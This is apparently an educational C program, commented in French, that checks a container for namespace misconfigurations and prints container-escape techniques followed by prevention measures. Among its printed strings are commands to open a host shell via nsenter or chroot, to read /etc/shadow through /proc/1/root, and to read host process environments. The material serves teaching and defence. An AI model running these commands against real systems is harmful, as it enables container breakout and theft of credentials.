/*
 * OBJECTIF  : Comprendre les techniques d'evasion de namespaces Linux
 * PREREQUIS : Bases C, namespaces, containers, /proc, syscalls
 * COMPILE   : gcc -o example example.c
 *
 * Ce programme demontre les techniques d'evasion de namespaces :
 * inspection des namespaces, nsenter, setns(), exploitation de
 * mauvaises configurations pour sortir d'un container.
 * Demonstration pedagogique - pas d'exploitation reelle.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>

/*
 * Etape 1 : Rappel sur les namespaces
 */
static void explain_namespaces(void) {
    printf("[*] Etape 1 : Namespaces et isolation\n\n");

    printf("    Chaque namespace cree une vue isolee :\n\n");

    printf("    ┌─── HOST ─────────────────────────────────┐\n");
    printf("    │ PID ns : 1(init), 2, 3, 1000(docker)... │\n");
    printf("    │ NET ns : eth0, docker0, veth...          │\n");
    printf("    │ MNT ns : /, /home, /var, /dev...         │\n");
    printf("    │                                          │\n");
    printf("    │  ┌─── CONTAINER ──────────────────┐      │\n");
    printf("    │  │ PID ns : 1(app), 2, 3          │      │\n");
    printf("    │  │ NET ns : eth0 (veth pair)      │      │\n");
    printf("    │  │ MNT ns : /, overlay rootfs     │      │\n");
    printf("    │  │                                │      │\n");
    printf("    │  │ Ne voit PAS les PID de l'hote  │      │\n");
    printf("    │  │ Ne voit PAS le reseau hote     │      │\n");
    printf("    │  │ Ne voit PAS le FS complet      │      │\n");
    printf("    │  └────────────────────────────────┘      │\n");
    printf("    └──────────────────────────────────────────┘\n\n");

    printf("    Objectif de l'evasion : passer du namespace\n");
    printf("    du container vers le namespace de l'hote.\n\n");
}

/*
 * Etape 2 : Inspecter les namespaces actuels
 */
static void inspect_namespaces(void) {
    printf("[*] Etape 2 : Nos namespaces vs ceux de PID 1\n\n");

    const char *ns_types[] = {
        "cgroup", "ipc", "mnt", "net", "pid", "user", "uts", NULL
    };

    printf("    %-10s %-30s %-30s %s\n", "Type", "Notre NS", "PID 1 NS", "Match?");
    printf("    %-10s %-30s %-30s %s\n", "──────────", "──────────────────────────",
           "──────────────────────────", "──────");

    for (int i = 0; ns_types[i]; i++) {
        char self_path[128], init_path[128];
        char self_target[128] = "?", init_target[128] = "?";

        snprintf(self_path, sizeof(self_path), "/proc/self/ns/%s", ns_types[i]);
        snprintf(init_path, sizeof(init_path), "/proc/1/ns/%s", ns_types[i]);

        ssize_t len = readlink(self_path, self_target, sizeof(self_target) - 1);
        if (len > 0) self_target[len] = '\0';

        len = readlink(init_path, init_target, sizeof(init_target) - 1);
        if (len > 0) init_target[len] = '\0';

        int same = (strcmp(self_target, init_target) == 0);
        printf("    %-10s %-30s %-30s %s\n",
               ns_types[i], self_target, init_target,
               same ? "SAME" : "DIFFERENT");
    }
    printf("\n");

    printf("    Si les namespaces sont DIFFERENTS -> on est isole (container)\n");
    printf("    Si les namespaces sont les MEMES  -> on partage avec l'hote\n\n");
}

/*
 * Etape 3 : Detecter les mauvaises configurations
 */
static void detect_misconfigurations(void) {
    printf("[*] Etape 3 : Detection de mauvaises configurations\n\n");

    int escape_possible = 0;

    /* 1. hostPID : on partage le PID namespace */
    char self_pid_ns[128] = "", init_pid_ns[128] = "";
    ssize_t len = readlink("/proc/self/ns/pid", self_pid_ns, sizeof(self_pid_ns) - 1);
    if (len > 0) self_pid_ns[len] = '\0';
    len = readlink("/proc/1/ns/pid", init_pid_ns, sizeof(init_pid_ns) - 1);
    if (len > 0) init_pid_ns[len] = '\0';

    if (strcmp(self_pid_ns, init_pid_ns) == 0 && strlen(self_pid_ns) > 0) {
        printf("    [!] hostPID : meme PID namespace que l'hote\n");
        printf("        -> On peut voir tous les processus hote\n");
        printf("        -> nsenter --target 1 --pid possible\n");
        escape_possible = 1;
    } else {
        printf("    [-] PID namespace : isole\n");
    }

    /* 2. hostNetwork */
    char self_net_ns[128] = "", init_net_ns[128] = "";
    len = readlink("/proc/self/ns/net", self_net_ns, sizeof(self_net_ns) - 1);
    if (len > 0) self_net_ns[len] = '\0';
    len = readlink("/proc/1/ns/net", init_net_ns, sizeof(init_net_ns) - 1);
    if (len > 0) init_net_ns[len] = '\0';

    if (strcmp(self_net_ns, init_net_ns) == 0 && strlen(self_net_ns) > 0) {
        printf("    [!] hostNetwork : meme NET namespace que l'hote\n");
        printf("        -> On voit toutes les interfaces reseau\n");
        escape_possible = 1;
    } else {
        printf("    [-] NET namespace : isole\n");
    }

    /* 3. Verifier CAP_SYS_ADMIN (necessaire pour setns/nsenter) */
    FILE *fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "CapEff:", 7) == 0) {
                unsigned long long caps = 0;
                sscanf(line + 7, " %llx", &caps);
                /* CAP_SYS_ADMIN = bit 21 */
                if (caps & (1ULL << 21)) {
                    printf("    [!] CAP_SYS_ADMIN present -> setns() possible\n");
                    escape_possible = 1;
                } else {
                    printf("    [-] CAP_SYS_ADMIN absent\n");
                }
                /* CAP_SYS_PTRACE = bit 19 */
                if (caps & (1ULL << 19)) {
                    printf("    [!] CAP_SYS_PTRACE present -> ptrace/nsenter possible\n");
                    escape_possible = 1;
                }
                break;
            }
        }
        fclose(fp);
    }

    /* 4. Verifier /proc/1/root */
    if (access("/proc/1/root", R_OK) == 0) {
        printf("    [!] /proc/1/root accessible -> acces au rootfs hote\n");
        escape_possible = 1;
    }

    printf("\n    Verdict : %s\n\n",
           escape_possible ? "[!] Evasion de namespace POSSIBLE"
                           : "[-] Isolation semble correcte");
}

/*
 * Etape 4 : Techniques d'evasion
 */
static void explain_escape_techniques(void) {
    printf("[*] Etape 4 : Techniques d'evasion de namespaces\n\n");

    printf("    Technique 1 : nsenter (si hostPID ou CAP_SYS_ADMIN)\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash\n");
    printf("    -> Execute un shell dans les namespaces de PID 1 (init hote)\n\n");

    printf("    Technique 2 : setns() syscall\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    int fd = open(\"/proc/1/ns/mnt\", O_RDONLY);\n");
    printf("    setns(fd, CLONE_NEWNS);  // Rejoindre le MNT ns de l'hote\n");
    printf("    close(fd);\n");
    printf("    // Repeter pour chaque namespace (pid, net, uts, ipc)\n");
    printf("    execve(\"/bin/bash\", ...);\n\n");

    printf("    Technique 3 : Via /proc/1/root (si accessible)\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    ls /proc/1/root/      -> voir le rootfs de l'hote\n");
    printf("    cat /proc/1/root/etc/shadow  -> lire les mots de passe\n");
    printf("    chroot /proc/1/root /bin/bash -> shell hote\n\n");

    printf("    Technique 4 : Via /proc/<pid>/cwd (processus hote)\n");
    printf("    ─────────────────────────────────────────────────\n");
    printf("    Si hostPID, on peut acceder au CWD de tout processus :\n");
    printf("    ls /proc/<host_pid>/cwd/\n");
    printf("    cat /proc/<host_pid>/environ\n\n");
}

/*
 * Etape 5 : Demonstration de lecture cross-namespace
 */
static void demo_proc_exploration(void) {
    printf("[*] Etape 5 : Exploration via /proc\n\n");

    /* Compter les processus visibles */
    int proc_count = 0;
    DIR *dir = opendir("/proc");
    if (dir) {
        struct dirent *entry;
        while ((entry = readdir(dir))) {
            if (entry->d_name[0] >= '1' && entry->d_name[0] <= '9')
                proc_count++;
        }
        closedir(dir);
    }
    printf("    Processus visibles : %d\n", proc_count);

    if (proc_count > 50) {
        printf("    [!] Beaucoup de processus -> probablement hostPID\n\n");

        /* Lister quelques processus interessants */
        printf("    Processus hote interessants :\n");
        dir = opendir("/proc");
        if (dir) {
            struct dirent *entry;
            int shown = 0;
            while ((entry = readdir(dir)) && shown < 10) {
                if (entry->d_name[0] < '1' || entry->d_name[0] > '9')
                    continue;

                char comm_path[128];
                snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name);
                FILE *fp = fopen(comm_path, "r");
                if (fp) {
                    char comm[64] = {0};
                    if (fgets(comm, sizeof(comm), fp)) {
                        comm[strcspn(comm, "\n")] = '\0';
                        /* Filtrer les processus interessants */
                        if (strstr(comm, "docker") || strstr(comm, "kubelet") ||
                            strstr(comm, "sshd") || strstr(comm, "containerd") ||
                            strstr(comm, "systemd") || strstr(comm, "cron")) {
                            printf("      PID %-6s : %s\n", entry->d_name, comm);
                            shown++;
                        }
                    }
                    fclose(fp);
                }
            }
            closedir(dir);
        }
    } else {
        printf("    [-] Peu de processus -> PID namespace isole\n");
    }
    printf("\n");
}

/*
 * Etape 6 : Prevention
 */
static void explain_prevention(void) {
    printf("[*] Etape 6 : Prevention des evasions de namespace\n\n");

    printf("    Mesure              | Protection\n");
    printf("    ────────────────────|──────────────────────────────────\n");
    printf("    Pas de hostPID      | Ne pas partager le PID namespace\n");
    printf("    Pas de hostNetwork  | Ne pas partager le NET namespace\n");
    printf("    Pas de hostIPC      | Ne pas partager l'IPC namespace\n");
    printf("    Drop CAP_SYS_ADMIN  | Empeche setns()/mount()\n");
    printf("    Drop CAP_SYS_PTRACE | Empeche ptrace/nsenter\n");
    printf("    User namespaces     | Remapper UID 0 -> non-root hote\n");
    printf("    Seccomp profile     | Bloquer setns, unshare, mount\n");
    printf("    AppArmor/SELinux    | Restreindre l'acces a /proc\n");
    printf("    /proc masquage      | --security-opt masked-paths\n\n");

    printf("    Verification :\n");
    printf("    docker inspect <container> | grep -i \"pid\\|network\\|privileged\"\n");
    printf("    kubectl get pod <pod> -o yaml | grep -i \"hostPID\\|hostNetwork\"\n\n");
}

int main(void) {
    printf("[*] Demo : Namespace Escape\n\n");

    explain_namespaces();
    inspect_namespaces();
    detect_misconfigurations();
    explain_escape_techniques();
    demo_proc_exploration();
    explain_prevention();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
